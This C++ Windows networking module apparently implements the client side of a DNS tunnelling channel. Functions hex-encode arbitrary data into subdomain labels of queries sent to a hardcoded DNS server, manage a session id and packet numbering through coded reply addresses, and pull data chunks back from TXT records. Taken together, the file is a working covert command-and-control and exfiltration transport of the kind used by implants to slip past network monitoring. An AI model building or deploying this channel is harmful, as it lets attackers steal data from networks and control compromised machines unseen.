#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winsock2.h>
#include <windns.h>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")


int startConnection(const char* domain) {
	if (!domain) {
		return -1;
	}

	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	

	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	{
		std::lock_guard<std::mutex> lock(g_dnsSendMutex);
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
	}
	
	LocalFree(pSrvList);
	
	
	if (status) {
		return -1;
	}
	
	if (!pDnsRecord) {
		return -1;
	}
	
	IN_ADDR ipaddr;
	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	std::string ipStr = inet_ntoa(ipaddr);
	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
	
	size_t lastDot = ipStr.rfind(".");
	if (lastDot == std::string::npos) {
		return -1;
	}
	
	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
	return connectionId;
}


int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
				case 200:  
					retCode = 0;
					goto cleanup;
					
				case 201:  
					break;
					
				case 202: 
					{
						int new_id = startConnection(domain);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;  
					break;
					
				case 203:  
					packetNumber = 0;
					i--;  
					break;
					
				case 204: 
					goto cleanup;
					
				default:
					goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
cleanup:
	if (pSrvList) {
		LocalFree(pSrvList);
	}
	return retCode;
}

int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "c." << packetNumber << "." << offset << "." << id << "." << data << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
			case 200:  
				retCode = 0;
				goto cleanup;
					
			case 201:  
				break;
					
			case 202: 
				{
					int new_id = startConnection(domain);
					if (new_id != -1) {
						id = new_id;
					}
				}
				i--;  
				break;
					
			case 203:  
				packetNumber = 0;
				i--;  
				break;
					
			case 204: 
				goto cleanup;
					
			default:
				goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}

int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain)
{
	if (!domain) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_TEXT; // 16
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (status == ERROR_SUCCESS && pDnsRecord) {

            if (pDnsRecord->wType == DNS_TYPE_TEXT &&
                pDnsRecord->Data.TXT.dwStringCount > 0)
            {
                std::wstring txt = pDnsRecord->Data.TXT.pStringArray[0];

                // --- TXT rỗng => hết chunk ---
                if (txt.empty()) {
                    retCode = 0;
                    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                    goto cleanup;
                }

                // --- Có chunk => lưu vào global ---
                {
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
					// TODO: Check lại kiểu dữ liệu, khả năng cao bị ghi đè, gửi sai dữ liệu
                    g_outChunk = txt;
                }

                retCode = 1; // Có chunk
                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                goto cleanup;
            }

            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
		
		Sleep(200); 
	}
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}


std::string convertToHex(const char* string) {
	if (!string) {
		return "";
	}

	std::ostringstream out;
	out << std::hex << std::setfill('0');
	
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
	}
	
	return out.str();
}